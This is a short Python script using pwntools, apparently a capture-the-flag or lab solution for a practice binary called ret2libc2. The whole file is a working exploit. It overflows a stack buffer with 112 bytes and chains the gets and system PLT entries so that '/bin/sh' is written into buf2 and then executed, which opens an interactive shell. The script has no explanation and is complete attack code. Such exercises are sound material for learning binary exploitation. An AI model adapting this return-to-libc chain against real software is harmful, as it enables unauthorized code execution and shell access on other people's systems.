from pwn import *;

io = process("./ret2libc2");

#buf2_addr = 0x0804A080;
elf = ELF("./ret2libc2");
buf2_addr = elf.symbols["buf2"];
gets_plt = elf.plt["gets"];
system_plt = elf.plt["system"];

payload = b'A' * 112 + p32(gets_plt) + p32(system_plt) + p32(buf2_addr) + p32(buf2_addr);

io.sendline(payload);
io.sendline(b"/bin/sh\n");
io.interactive();
